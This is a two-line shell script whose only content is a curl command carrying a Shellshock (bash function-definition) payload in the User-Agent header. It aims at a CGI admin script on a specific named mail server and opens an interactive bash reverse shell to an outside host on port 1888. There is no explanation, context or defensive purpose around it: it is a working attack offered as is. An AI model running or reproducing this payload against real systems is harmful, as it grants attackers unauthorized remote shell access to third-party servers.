#!/bin/sh

curl  -A "() { :; }; /bin/bash -i > /dev/tcp/comealong.oicp.net/1888 0<&1 2>&1" http://mail.cscb.cn/cgi-bin/madmin.cgi -v

